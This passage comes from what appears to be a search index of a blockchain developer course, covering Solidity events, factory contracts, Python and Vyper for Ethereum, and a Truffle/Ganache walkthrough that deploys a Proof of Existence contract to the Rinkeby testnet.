public returns ( int256 ) { emit LogReturnValue ( msg . sender , _value ) ; return _value ; } } This is how you declare an event called LogReturnValue . Use the event keyword followed by the event name. A recent update to the Solidity compiler requires the emit keyword before an event is logged. This helps further clarify when events are being logged in the contract code. Declaring events require that you specify the parameter type as well as a name for the parameter. This parameter name is the name that will appear in the log, so make it descriptive and clear. You can add the indexed keyword to event parameters. Up to three parameters can receive the indexed attribute. This increases the searchability of events. It is possible to filter for specific values of indexed arguments in the user interface. Here is a link to the solidity documentation on events.","title":"Declaring Events"},{"location":"S03-smart-contracts/M2-solidity/L7-events-and-logs/#use-cases","text":"The common uses for events can be broken down into three main use cases: Events can provide smart contract return values for the User Interface They can act as asynchronous triggers with data and They can act as a cheaper form of storage.","title":"Use Cases"},{"location":"S03-smart-contracts/M2-solidity/L7-events-and-logs/#get-values-when-transaction-is-mined","text":"When a transaction is sent via web3.js, a transaction hash is returned, even if the contract functions specifies a return value. Transactions don\u2019t return the contract value because transactions are not immediately mined and included in the blockchain - it takes time (they are asynchronous). You can use an event in the contract function in conjunction with an event watcher in the UI to observe a variable value when the transaction is mined.","title":"Get values when transaction is mined"},{"location":"S03-smart-contracts/M2-solidity/L7-events-and-logs/#trigger-application-logic","text":"You can use an event watcher as a trigger for application logic beyond just reading return values. You could take another action, display a message or update the UI when an event is observed.","title":"Trigger application logic"},{"location":"S03-smart-contracts/M2-solidity/L7-events-and-logs/#events-as-data-storage","text":"Logs, which are essentially the same as events (the context dictates which term is more appropriate) can also be used as a cheaper form of storage. Logs cost 8 gas per byte whereas contract storage costs 20,000 per 32 bytes, or 625 gas per byte. Logs are cheaper, but also cannot be accessed from any contracts so their use case as storage objects is much more limited. Even still, logs can be useful for aggregating historical reference data. Events are inheritable members of contracts. You can call events of parent contracts from within child contracts. When called from within a contract, events cause arguments to be stored in the transaction log, a special data structure in the blockchain. The logs are associated with the address of the contract and will be incorporated into the blockchain, persisting as long as a block is accessible. Log and event data are not accessible from within contracts, not even from the contract that created the log. Events are useful when interacting with an application. They can provide notifications and confirmations of transactions happening in the smart contract. They are also useful for debugging purposes during development. Logs are not part of the blockchain per se since they are not required for consensus (they are just historical data), but they are verified by the blockchain as the transaction receipt hashes are stored inside the blocks. Remember that events are not emitted until the transaction has been successfully mined.","title":"Events as Data Storage"},{"location":"S03-smart-contracts/M2-solidity/L7-events-and-logs/#when-to-log-events","text":"Logging an event for every state change of the contract is a good heuristic for when you should use events. This allows you to track any and all updates to the state of the contract by setting up event watchers in your javascript files. Additional Resources: Technical introduction to Events and Logs in Ethereum (Joseph Chow, Consensys) Events - Solidity Docs Listening to events with web3.js or via the contract object Article: Deep Dive Into Ethereum Logs Article: Everything You Ever Wanted to Know About Events and Logs on Ethereum","title":"When to log events"},{"location":"S03-smart-contracts/M2-solidity/L8-factory-contracts/","text":"Factory Contracts Solidity is a contract-oriented programming language, which adopts many of the design principles of object-oriented programming languages. We can implement a factory design pattern that will ensure that every contract deployed using the factory adheres to a certain standard. Token Factory Example Let's look at what a standard Ethereum token implementation might look like. Tokens are a great case for a factory pattern because we want all of the token implementations to be compatible and convertible with one another. Defining a standard interface that all tokens should implement can ease development and benefit the entire ecosystem. ### Token Contract Here is the start of a basic Token contract. You can imagine that we might want to store more data in our Token contract. This contract does not have functions implemented yet. As we add functions and the contract increases in complexity, it will be more difficult to ensure that every Token contract is implementing the same interface and is bug-free. Token Factory Deploying all of these standard compliant tokens through a token factory will abstract away many of the implementation details. We can use the factory design pattern in Solidity. In the factory contract, we need to make the standardized token contract available by importing it. When we want to create a new token, we can pass the required constructor arguments for the Token contract into the token factory create token function. In the create token function we specify that we are creating a new Token contract with the new keyword. The token contract creation will return the address of the new contract. We know that this contract is of type token and we specify the type of the newToken variable. We can store the creator of the new token, and transfer all of the newly minted tokens to the caller. The function returns the address of the new token contract. This new contract has all of the state variables and functions that we specified in the token contract. This is a useful design pattern that has numerous potential use cases. The ConsenSys GitHub contains an implementation of the EIP20 interface , as well as an EIP20 token factory. Additional Resources: Article: Manage several contracts with factories","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L8-factory-contracts/#factory-contracts","text":"Solidity is a contract-oriented programming language, which adopts many of the design principles of object-oriented programming languages. We can implement a factory design pattern that will ensure that every contract deployed using the factory adheres to a certain standard.","title":"Factory Contracts"},{"location":"S03-smart-contracts/M2-solidity/L8-factory-contracts/#token-factory-example","text":"Let's look at what a standard Ethereum token implementation might look like. Tokens are a great case for a factory pattern because we want all of the token implementations to be compatible and convertible with one another. Defining a standard interface that all tokens should implement can ease development and benefit the entire ecosystem. ### Token Contract Here is the start of a basic Token contract. You can imagine that we might want to store more data in our Token contract. This contract does not have functions implemented yet. As we add functions and the contract increases in complexity, it will be more difficult to ensure that every Token contract is implementing the same interface and is bug-free.","title":"Token Factory Example"},{"location":"S03-smart-contracts/M2-solidity/L8-factory-contracts/#token-factory","text":"Deploying all of these standard compliant tokens through a token factory will abstract away many of the implementation details. We can use the factory design pattern in Solidity. In the factory contract, we need to make the standardized token contract available by importing it. When we want to create a new token, we can pass the required constructor arguments for the Token contract into the token factory create token function. In the create token function we specify that we are creating a new Token contract with the new keyword. The token contract creation will return the address of the new contract. We know that this contract is of type token and we specify the type of the newToken variable. We can store the creator of the new token, and transfer all of the newly minted tokens to the caller. The function returns the address of the new token contract. This new contract has all of the state variables and functions that we specified in the token contract. This is a useful design pattern that has numerous potential use cases. The ConsenSys GitHub contains an implementation of the EIP20 interface , as well as an EIP20 token factory.","title":"Token Factory"},{"location":"S03-smart-contracts/M2-solidity/L8-factory-contracts/#additional-resources","text":"Article: Manage several contracts with factories","title":"Additional Resources:"},{"location":"S03-smart-contracts/M2-solidity/L9-solidity-by-example/","text":"Currently on LMS This content is a external content, the excellent resource Solidity By Example","title":"Index"},{"location":"S03-smart-contracts/M2-solidity/L9-solidity-by-example/#currently-on-lms","text":"This content is a external content, the excellent resource Solidity By Example","title":"Currently on LMS"},{"location":"S03-smart-contracts/M3-python/L1-background-and-context/","text":"Python in Ethereum: Background and Context After going through all this Solidity content, (which looks like JavaScript but as you now know is very different from JavaScript) we may have some Python developers saying, \"What about us?\" Python is, after all, one of the most popular and accessible programming languages. When people want to start programming, they typically feel they have to decide between JavaScript or Python. So, what gives? Where's the Python in Ethereum? While it's not as popular as Solidity and JavaScript, there are some exciting ways to build on Ethereum using Python. In this section, we're going to go over a few of those projects. In the following section, we'll go over Vyper, the programming language whose syntax is a subset of Python's. Vyper Vyper is an experimental, contract-oriented, pythonic programming language that targets the Ethereum Virtual Machine. Please note: there have been some issues with the Vyper compiler. Like Python, writing clear, understandable code is of primary importance in Vyper. Vyper is not trying to be a replacement for Solidity. It is meant to be a more security focused smart contract programming language and will likely not be able to do everything that Solidity can. Its development is uncertain and not nearly as strong as Solidity. You can read more about Vyper in this section here. Note that you can use Vyper with a number of development frameworks, including Truffle and Brownie. Brownie and Web3.py Brownie is a Python-based development and testing framework for smart contracts running on the EVM. It uses Web3.py as well as Solidity. It is most well-known for being the development framework the Yearn.Finance team uses to build their powerful DeFi platform and CRV. Brownie definitely takes some notes from Truffle (they are both \"sweet\") , including having a brownie init command and their equivalent of Truffle boxes, \"Brownie Mixes.\" This makes it an easy tool for a lot of Truffle developers familiar with Truffle. Here are some tutorials to introduce you to Brownie: Tutorial: Develop a DeFi Project using Python (Chainlink){target=_blank} Tutorial: Vyper and Brownie Contract Development on EVM Chains An interesting tutorial walking through developing a contract using Vyper and Brownie. Yellow Paper rewrite Piper Merriam is a Python-based Ethereum developer who works for the Ethereum Foundation. They have proposed an interesting project : Replacing Ethereum's yellow paper (which we studied earlier) with executable markdown. This was inspired by Ethereum 2.0's Beacon chain specifications. Rather than writing a document of specifications, the Ethereum 2.0 developer teams built a series of tests based on the spec conditions of a theoretical Beacon chain. Then, Ethereum 2.0 software clients only had to make sure they passed those tests. Merriam is proposing a similar exercise, but for Ethereum Mainnet (the PoW chain), based in Python. The goal would be to replace the yellow paper, which can be very challenging to read. It would rely heavily on py-EVM (a Python implementation of the EVM). The whole project is very new and you can check it's GitHub repository for updates. Maybe you can even get involved! Fe Fe is \"an emerging smart contract language for the Ethereum blockchain.\" It's influenced both by Python and Rust and was released in January 2021. You can read more about it here. To be honest, it looks more like Rust than Python, but that's just our opinion. Conclusion While more niche, it's possible to be a Python developer and contribute to the Ethereum (and wider blockchain) ecosystem! Solidity is still important to know, but we hope this gets you started finding more Python opportunities.","title":"Python in Ethereum: Background and Context"},{"location":"S03-smart-contracts/M3-python/L1-background-and-context/#python-in-ethereum-background-and-context","text":"After going through all this Solidity content, (which looks like JavaScript but as you now know is very different from JavaScript) we may have some Python developers saying, \"What about us?\" Python is, after all, one of the most popular and accessible programming languages. When people want to start programming, they typically feel they have to decide between JavaScript or Python. So, what gives? Where's the Python in Ethereum? While it's not as popular as Solidity and JavaScript, there are some exciting ways to build on Ethereum using Python. In this section, we're going to go over a few of those projects. In the following section, we'll go over Vyper, the programming language whose syntax is a subset of Python's.","title":"Python in Ethereum: Background and Context"},{"location":"S03-smart-contracts/M3-python/L1-background-and-context/#vyper","text":"Vyper is an experimental, contract-oriented, pythonic programming language that targets the Ethereum Virtual Machine. Please note: there have been some issues with the Vyper compiler. Like Python, writing clear, understandable code is of primary importance in Vyper. Vyper is not trying to be a replacement for Solidity. It is meant to be a more security focused smart contract programming language and will likely not be able to do everything that Solidity can. Its development is uncertain and not nearly as strong as Solidity. You can read more about Vyper in this section here. Note that you can use Vyper with a number of development frameworks, including Truffle and Brownie.","title":"Vyper"},{"location":"S03-smart-contracts/M3-python/L1-background-and-context/#brownie-and-web3py","text":"Brownie is a Python-based development and testing framework for smart contracts running on the EVM. It uses Web3.py as well as Solidity. It is most well-known for being the development framework the Yearn.Finance team uses to build their powerful DeFi platform and CRV. Brownie definitely takes some notes from Truffle (they are both \"sweet\") , including having a brownie init command and their equivalent of Truffle boxes, \"Brownie Mixes.\" This makes it an easy tool for a lot of Truffle developers familiar with Truffle. Here are some tutorials to introduce you to Brownie: Tutorial: Develop a DeFi Project using Python (Chainlink){target=_blank} Tutorial: Vyper and Brownie Contract Development on EVM Chains An interesting tutorial walking through developing a contract using Vyper and Brownie.","title":"Brownie and Web3.py"},{"location":"S03-smart-contracts/M3-python/L1-background-and-context/#yellow-paper-rewrite","text":"Piper Merriam is a Python-based Ethereum developer who works for the Ethereum Foundation. They have proposed an interesting project : Replacing Ethereum's yellow paper (which we studied earlier) with executable markdown. This was inspired by Ethereum 2.0's Beacon chain specifications. Rather than writing a document of specifications, the Ethereum 2.0 developer teams built a series of tests based on the spec conditions of a theoretical Beacon chain. Then, Ethereum 2.0 software clients only had to make sure they passed those tests. Merriam is proposing a similar exercise, but for Ethereum Mainnet (the PoW chain), based in Python. The goal would be to replace the yellow paper, which can be very challenging to read. It would rely heavily on py-EVM (a Python implementation of the EVM). The whole project is very new and you can check it's GitHub repository for updates. Maybe you can even get involved!","title":"Yellow Paper rewrite"},{"location":"S03-smart-contracts/M3-python/L1-background-and-context/#fe","text":"Fe is \"an emerging smart contract language for the Ethereum blockchain.\" It's influenced both by Python and Rust and was released in January 2021. You can read more about it here. To be honest, it looks more like Rust than Python, but that's just our opinion.","title":"Fe"},{"location":"S03-smart-contracts/M3-python/L1-background-and-context/#conclusion","text":"While more niche, it's possible to be a Python developer and contribute to the Ethereum (and wider blockchain) ecosystem! Solidity is still important to know, but we hope this gets you started finding more Python opportunities.","title":"Conclusion"},{"location":"S03-smart-contracts/M3-python/L2-vyper-overview/","text":"Vyper Overview Despite there being concerns about its compiler and the slower rate of development compared to Solidity, there are still many resources and ways to build smart contracts using Vyper. In this section, we'll discuss more about the Vyper language and provide resources where you can learn more about the language. Please note, Vyper is still considered somewhat experimental. Vyper Design Principles Vyper has a few principles and goals that aim to make it a language that is ideal for programming smart contracts. From its docs (which we quote extensively in this section): Security is a primary focus for any smart contract language and Vyper maintains that \u201cit should be possible and natural to build secure smart contracts in Vyper.\u201d Vyper code should be not just human readable, but make it difficult to write misleading code. This directive is aimed at making contract audits as successful as possible. Striving for language and compiler simplicity support the other goals by keeping confusing complexity under control. To achieve these goals, Vyper implements the following features: Bounds and overflow checking Support for signed integers and decimal fixed point numbers Decidability - Reliably compute upper bounds for gas consumption of any function call Strong typing Small and understandable compiler code Limited support for pure functions There is a notable lack of the following features that are present in Solidity: Modifiers Modifiers make it easier to write misleading code. It encourages writing code where execution jumps around the source file, making audits more difficult. Vyper encourages inline checks in each function to improve clarity. Class Inheritance Inheritance also makes it easier to write misleading code. Contracts\u2019 logic is spread across multiple files, decreasing readability and requires additional understanding about how inheritance works in case of conflicts. Inline Assembly Inline assembly makes it possible to manipulate variables without referencing it directly by name. This makes development and auditing more difficult and can obfuscate bugs. Function overloading Contracts with overloaded functions can be confusing. It may not be clear which function is being called in specific situations. Operator overloading Recursive calling It is not possible to set an upper bound on gas limits in contracts with recursive calling Infinite-length loops It is not possible to set an upper bound on gas limits in contracts with infinite length loops Binary fixed point In binary fixed point, approximations are required (e.g. in Python 0.3 + 0.3 + 0.3 + 0.1 != 1). As you can see in the list of features that Vyper is lacking, writing clear, understandable code is of primary importance. Vyper is not trying to be a replacement for Solidity. It is meant to be a more security focused smart contract programming language and will likely not be able to do everything that Solidity can. Additional Links Code: Simple Bank in Vyper (ConsenSys Academy) This is a Vyper version of our Simple Bank exercise (normally in Solidity) you'll encounter later in this section. Course: Learn Vyper (0.2) A comprehensive series of videos that covers Data Types, Functions, Variables, Logic Control, Errors, Interfaces and much more. Tutorial: Develop a DeFi Project using Python (Chainlink) Tutorial: Vyper and Brownie Contract Development on EVM Chains An interesting tutorial walking through developing a contract using Vyper and Brownie. Docs: Vyper by Example From the Vyper documentation, a walkthrough of common development patterns in Vyper.","title":"Index"},{"location":"S03-smart-contracts/M3-python/L2-vyper-overview/#vyper-overview","text":"Despite there being concerns about its compiler and the slower rate of development compared to Solidity, there are still many resources and ways to build smart contracts using Vyper. In this section, we'll discuss more about the Vyper language and provide resources where you can learn more about the language. Please note, Vyper is still considered somewhat experimental.","title":"Vyper Overview"},{"location":"S03-smart-contracts/M3-python/L2-vyper-overview/#vyper-design-principles","text":"Vyper has a few principles and goals that aim to make it a language that is ideal for programming smart contracts. From its docs (which we quote extensively in this section): Security is a primary focus for any smart contract language and Vyper maintains that \u201cit should be possible and natural to build secure smart contracts in Vyper.\u201d Vyper code should be not just human readable, but make it difficult to write misleading code. This directive is aimed at making contract audits as successful as possible. Striving for language and compiler simplicity support the other goals by keeping confusing complexity under control. To achieve these goals, Vyper implements the following features: Bounds and overflow checking Support for signed integers and decimal fixed point numbers Decidability - Reliably compute upper bounds for gas consumption of any function call Strong typing Small and understandable compiler code Limited support for pure functions There is a notable lack of the following features that are present in Solidity: Modifiers Modifiers make it easier to write misleading code. It encourages writing code where execution jumps around the source file, making audits more difficult. Vyper encourages inline checks in each function to improve clarity. Class Inheritance Inheritance also makes it easier to write misleading code. Contracts\u2019 logic is spread across multiple files, decreasing readability and requires additional understanding about how inheritance works in case of conflicts. Inline Assembly Inline assembly makes it possible to manipulate variables without referencing it directly by name. This makes development and auditing more difficult and can obfuscate bugs. Function overloading Contracts with overloaded functions can be confusing. It may not be clear which function is being called in specific situations. Operator overloading Recursive calling It is not possible to set an upper bound on gas limits in contracts with recursive calling Infinite-length loops It is not possible to set an upper bound on gas limits in contracts with infinite length loops Binary fixed point In binary fixed point, approximations are required (e.g. in Python 0.3 + 0.3 + 0.3 + 0.1 != 1). As you can see in the list of features that Vyper is lacking, writing clear, understandable code is of primary importance. Vyper is not trying to be a replacement for Solidity. It is meant to be a more security focused smart contract programming language and will likely not be able to do everything that Solidity can.","title":"Vyper Design Principles"},{"location":"S03-smart-contracts/M3-python/L2-vyper-overview/#additional-links","text":"Code: Simple Bank in Vyper (ConsenSys Academy) This is a Vyper version of our Simple Bank exercise (normally in Solidity) you'll encounter later in this section. Course: Learn Vyper (0.2) A comprehensive series of videos that covers Data Types, Functions, Variables, Logic Control, Errors, Interfaces and much more. Tutorial: Develop a DeFi Project using Python (Chainlink) Tutorial: Vyper and Brownie Contract Development on EVM Chains An interesting tutorial walking through developing a contract using Vyper and Brownie. Docs: Vyper by Example From the Vyper documentation, a walkthrough of common development patterns in Vyper.","title":"Additional Links"},{"location":"S03-smart-contracts/M4-design-patterns/L1-intro-smart-contracts/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M4-design-patterns/L1-intro-smart-contracts/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/","text":"Writing a Smart Contract (Proof of Existence Exercise) This walkthrough is based on this Medium {target=_blank} post by Manuel Araoz. What is Proof of Existence? Proof of Existence is a service that verifies the existence of a document or file at a specific time via timestamped transactions. PoE utilizes the one-way nature of cryptographic hash functions to reduce the amount of information that needs to be stored on the blockchain. In this walkthrough, we are going to introduce some basic Ethereum smart contract development best practices by creating a simple proof of existence contract and interacting with it on the blockchain. Set up the Environment Installing NodeJS For this example we need NodeJS installed on your machine. There are several ways to get it, but we recommend using NVM (Node Version Manager). This way we can execute npm install -g without needing sudo , which can be dangerous. Here are the official instructions for all operating systems . On the other hand, you can install NodeJS via APT, YUM or Homebrew, but will have to run the npm install -g scripts below with sudo . Connect to a Blockchain To develop Ethereum applications, you will need a client to connect to an Ethereum blockchain. You can use Geth , Parity or a development blockchain such as Ganache . In this walkthrough we will be using the Ganache command line interface, ganache-cli. You can find the documentation on ganache-cli here . You can install ganache-cli with the following command: $ npm install -g ganache-cli And start ganache-cli with $ ganache-cli When ganache-cli starts, you can see that it starts with 10 accounts. Each of those accounts comes prefunded with Ether so we do not need to mine or acquire funds from a faucet. Ganache-cli starts a development blockchain that needs to be running while developing the application so leave it running while we continue working on the application. Truffle Development Framework Solidity is the most popular programming language for writing smart contracts in Ethereum. We will be using Solidity throughout this course. The Truffle development framework is one of the most popular development tools for writing Solidity smart contracts for Ethereum. Truffle will help us compile, deploy and test our smart contracts once they are written. To install truffle $ npm install -g truffle $ sudo npm install -g @truffle/hdwallet-provider Create a project directory and set up truffle $ mkdir proof-of-existence $ cd proof-of-existence/ $ truffle init Truffle sets up a contracts directory where we will write our contracts, a migrations directory where we will write scripts to deploy our contracts along with a test directory where we will write tests to make sure that our contracts work as expected. In truffle-config.js we need to specify the network that we will be using. In the module.exports object, add the following information: Note: This information is cooked in when we initialized truffle, head over the truffle.config.js file, and view the commented out code under networks. module . exports = { networks : { development : { host : 'localhost' , port : 8545 , network_id : '*' } } }; We use this information because ganache-cli is running our development blockchain on localhost:8545, and this is what we want to connect to. Specifying network_id as * means that any truffle will deploy to any network running at localhost:8545. Truffle comes with a Migrations.sol contract that keeps track of our migrations as well as a 1_initial_migrations.js script to deploy the Migrations.sol contract. Run the following command in the terminal in your project directory: $ truffle migrate The terminal should print information about the deployment of the Migrations contract. This means that your environment is set up correctly and we can move on to writing our smart contracts. Writing the Smart Contract Run the following command in the terminal in your project directory: $ truffle create contract ProofOfExistence1 This command will create a Solidity file in the contracts directory called \u201cProofOfExistence1.sol\u201d and set up the boilerplate code for the contract, a contract definition along with a contract constructor. Open ProofOfExistence.sol in your text editor. Update your ProofOfExistence1.sol file so that it looks like this . We are starting with something simple, but incorrect and we are going to work towards a better contract. Our contract has a state and two functions. This contract actually has two different kinds of functions, a transactional function (notarize) and a read-only, or view , function (proofFor). Transactional functions can modify state whereas constant functions can only read the state and return values. Let\u2019s deploy this contract to our test network. Create a new migrations file in the migrations directory called 2_deploy_contracts.js. In this file add the following: const ProofOfExistence1 = artifacts . require ( './ProofOfExistence1.sol' ); module . exports = function ( deployer ) { deployer . deploy ( ProofOfExistence1 ); }; This script tells Truffle to get the contract information from ProofOfExitence.sol and deploy it to the specified network. Now we just need to tell Truffle to run the deployment. Run the following command in the terminal in your project directory: $ truffle migrate In the terminal output you should see that Truffle compiled ProofOfExistence.sol and printed some warning regarding the contract. Then it runs the migrations using the network \u2018development\u2019 that we specified in truffle-config.js. Truffle remembers which contracts it has migrated to the network, so if we want to run the migration again on the same network, we need to use the --reset option like so: $ truffle migrate --reset You can find more information about truffle migrations here . Interacting with your Smart Contract Our contract is now on the development blockchain, so we can interact with it. We can read the contract state from the blockchain and update the state by calling the notarize function. We can do this using the Truffle console. Bring up the truffle console with the command: $ truffle console You should see truffle(development)> On the first line enter: const poe = await ProofOfExistence1 . at ( ProofOfExistence1 . address ) This line says that the variable \u201cpoe\u201d is an instance of ProofOfExistence1.sol found at the address that we just deployed. You can see the address by entering truffle(development)> poe.address '0xc490df1850010ea8146c1dd3e961fedbf6b85bef' To call the notarize function, we call it like any other javascript function. truffle(development)> poe.notarize('Hello World!') { tx: '0x60ae...2643cbea65', receipt: \u2026 } This function causes a state change, so it is a transactional function. Transactional functions return a Promise that resolves to a transaction object. We can get the proof for the string with truffle(development)> poe.proofFor('Hello World!') \u20180x7f83b...126d9069\u2019 And check that the contract\u2019s state was correctly changed truffle(development)> poe.proof() '0x7f83b...126d9069' The hashes match! Iterating the code Our contract works! But it can only store one proof at a time. Let\u2019s change that. Exit the Truffle console and create a new file called ProofOfExistence2.sol: truffle ( development ) > . exit $ truffle create contract ProofOfExistence2 Update the ProofOfExistence2 contract to match this contract . The main changes between the first version and this version are that we changed the \u201cproof\u201d variable to a bytes32 array called \u201cproofs\u201d and made it private. We also added a function called \u201chasProof\u201d to check if a proof has already been stored in the array. Update the migration script 2_deploy_contracts.js to deploy the new contract and deploy it to the development blockchain. $ truffle migrate --reset Launch the console to interact with the new contract. $ truffle console Save the deployed contract truffle ( development ) > const poe = await ProofOfExistence2 . at ( ProofOfExistence2 . address ) We can check for a proof. truffle(development)> poe.checkDocument('Hello World!') false It returns false because we haven\u2019t added anything yet. Let\u2019s do that now. truffle(development)> poe.notarize('Hello World!') { tx: '0xd6f72...10a6e', receipt: { transactionHash: ... logs: [] } truffle(development)> poe.checkDocument('Hello World!') true We can check to make sure that our contract will store multiple proofs. truffle(development)> poe.notarize('Hello Consensys!') { tx: '0x8b566...091ace', receipt: { transactionHash: ... logs: [] } truffle(development)> poe.checkDocument('Hello Consensys!') True Looping over arrays in smart contracts can get expensive as arrays get longer. Using a mapping is a better solution. Let\u2019s create a final version in ProofOfExistence3.sol using mappings. You can use this code for the contract. Modify the deployment script to deploy the new contract and test it in the console to make sure that it behaves just like ProofOfExistence2.sol. Deploying to the Testnet From here, we are going to deviate from the Zeppelin Solutions walkthrough. If you want to learn how to deploy contracts using the geth console (which requires syncing with the testnet), you can consult the Zeppelin Solutions walkthrough. The first step in our alternate deployment method is to get an Ethereum account on Metamask. On the landing page, click \u201cGet Chrome Extension.\u201d Once the extension is installed, accept the terms of use and enter a password for your account. You will be shown 12 words that can be used to restore your wallet. A word of caution, do NOT publish these words anywhere public. Anyone that has these 12 words has access to your wallet. Save these 12 words in a file called '.secret' in your project directory. Note: They do not need to be contained within a string when adding to .secret, line 25 in truffle config assists with this detail. With Truffle version 5, the truffle-config.js file comes populated with a lot of configuration settings that are commented out. // truffle - config . js 21 const HDWallet = require ( '@truffle/hdwallet-provider' ); 22 const infuraURL = 'https://rinkeby.infura.io/v3/<Project_ID>' <-- project id here 23 24 const fs = require ( 'fs' ); 25 const mnemonic = fs . readFileSync ( '.secret' ) . toString () . trim (); Uncomment lines 21 - 25. Line 21 will import the tool to derive a private key and address from a mnemonic. Entering your Infura API key in line 22 will allow you to easily deploy contracts to Ethereum (we will cover how to get an API key shortly). Lines 24 and 25 will import your seed phrase (from the .secret file) into the file. Truffle will use these words to access your wallet and deploy the contract. Deploying the contract requires us to make a transaction on the testnet, so we need some ether to pay for the transaction. You can get free Rinkeby ether by going to this website and following the instructions. Make sure you enter the Ethereum address for your 1st Metamask account. Now that we have a testnet account with Ether, we need to configure Truffle to be able to deploy the contract. To deploy contracts to the testnet using Truffle without having to sync a local node, you can use Infura. Infura allows you to access a fully synced Ethereum node via their API. We will use their API to deploy our contracts to the Rinkeby testnet. Go to the Infura website and sign up for a free account. Save the Rinkeby test network URL that Infura provides in a variable called infuraURL in truffle-config.js. Your Project ID is a unique code provided by Infura. // truffle - config . js const infuraURL = 'https://rinkeby.infura.io/v3/<Project_ID>' <-- project id here For Truffle to derive our ethereum address from the mnemonic, we need to install the Truffle HD wallet provider. In the terminal located in the proof-of-existence project root run: npm install @truffle / hdwallet - provider And import the HD wallet provider into your truffle-config.js file, ensure you have the following. const HDWallet = require ( '@truffle/hdwallet-provider' ) Now we just need to add the rinkeby network configuration to the networks object in truffle-config.js module.exports. Change the module.exports object to resemble this: networks: { development: { host: 'localhost', port: 8545, network_id: '*' }, rinkeby: { provider: () => new HDWalletProvider(mnemonic, infuraURL), network_id: 4, // Rinkeby's network id gas: 5500000, }, } Where the \u201cmnemonic\u201d variable is the 12 word seed phrase that you saved from metamask and the \u201cinfuraKey\u201d variable is your Infura Project ID. You just have to run \u201ctruffle migrate\u201d for the correct network and your contract will be deployed! $ truffle migrate --network rinkeby Starting migrations... ====================== > Network name: 'rinkeby' > Network id: 4 > Block gas limit: 7602728 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x6c5cc0090db1147dfadfd4a84280715e8e8bb3bb820401e32ea40b4f6e521178 > Blocks: 0 Seconds: 12 > contract address: 0x8e8786683C33147dA500c3F54A9690A4f81a3D48 > account: 0x196150D99a325f624F7c420Cf80ca6ab9a1BeDBA > balance: 0 .987611032134329654 > gas used: 284908 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00569816 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00569816 ETH 2_deploy_contracts.js ===================== Deploying 'ProofOfExistence2' ----------------------------- > transaction hash: 0x4692cc0311571c70f7d425f9a89702a355abe8345961c871980a279c8b16e20a > Blocks: 1 Seconds: 12 > contract address: 0x096c0636F39372Fa83EF498bCC5Bce86C8fd1Fb5 > account: 0x196150D99a325f624F7c420Cf80ca6ab9a1BeDBA > balance: 0 .978713032134329654 > gas used: 402866 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00805732 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00805732 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .01375548 ETH The terminal prints the addresses of the deployed contracts as well as the transaction hashes of the deployment transactions. This information can also be referenced in the contract artifacts, which are stored in proof-of-existence/build/contracts/. Deployment information is found at the bottom of each JSON file. You can view your deployed contracts at https://rinkeby.etherscan.io/ and paste in the deployed contract address to have a look you yourself, you can now interact with the deployed contract on the Rinkeby test network!","title":"Writing a Smart Contract (Proof of Existence Exercise)"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#writing-a-smart-contract-proof-of-existence-exercise","text":"This walkthrough is based on this Medium {target=_blank} post by Manuel Araoz.","title":"Writing a Smart Contract (Proof of Existence Exercise)"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#what-is-proof-of-existence","text":"Proof of Existence is a service that verifies the existence of a document or file at a specific time via timestamped transactions. PoE utilizes the one-way nature of cryptographic hash functions to reduce the amount of information that needs to be stored on the blockchain. In this walkthrough, we are going to introduce some basic Ethereum smart contract development best practices by creating a simple proof of existence contract and interacting with it on the blockchain.","title":"What is Proof of Existence?"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#set-up-the-environment","text":"","title":"Set up the Environment"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#installing-nodejs","text":"For this example we need NodeJS installed on your machine. There are several ways to get it, but we recommend using NVM (Node Version Manager). This way we can execute npm install -g without needing sudo , which can be dangerous. Here are the official instructions for all operating systems . On the other hand, you can install NodeJS via APT, YUM or Homebrew, but will have to run the npm install -g scripts below with sudo .","title":"Installing NodeJS"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#connect-to-a-blockchain","text":"To develop Ethereum applications, you will need a client to connect to an Ethereum blockchain. You can use Geth , Parity or a development blockchain such as Ganache . In this walkthrough we will be using the Ganache command line interface, ganache-cli. You can find the documentation on ganache-cli here . You can install ganache-cli with the following command: $ npm install -g ganache-cli And start ganache-cli with $ ganache-cli When ganache-cli starts, you can see that it starts with 10 accounts. Each of those accounts comes prefunded with Ether so we do not need to mine or acquire funds from a faucet. Ganache-cli starts a development blockchain that needs to be running while developing the application so leave it running while we continue working on the application.","title":"Connect to a Blockchain"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#truffle-development-framework","text":"Solidity is the most popular programming language for writing smart contracts in Ethereum. We will be using Solidity throughout this course. The Truffle development framework is one of the most popular development tools for writing Solidity smart contracts for Ethereum. Truffle will help us compile, deploy and test our smart contracts once they are written. To install truffle $ npm install -g truffle $ sudo npm install -g @truffle/hdwallet-provider Create a project directory and set up truffle $ mkdir proof-of-existence $ cd proof-of-existence/ $ truffle init Truffle sets up a contracts directory where we will write our contracts, a migrations directory where we will write scripts to deploy our contracts along with a test directory where we will write tests to make sure that our contracts work as expected. In truffle-config.js we need to specify the network that we will be using. In the module.exports object, add the following information: Note: This information is cooked in when we initialized truffle, head over the truffle.config.js file, and view the commented out code under networks. module . exports = { networks : { development : { host : 'localhost' , port : 8545 , network_id : '*' } } }; We use this information because ganache-cli is running our development blockchain on localhost:8545, and this is what we want to connect to. Specifying network_id as * means that any truffle will deploy to any network running at localhost:8545. Truffle comes with a Migrations.sol contract that keeps track of our migrations as well as a 1_initial_migrations.js script to deploy the Migrations.sol contract. Run the following command in the terminal in your project directory: $ truffle migrate The terminal should print information about the deployment of the Migrations contract. This means that your environment is set up correctly and we can move on to writing our smart 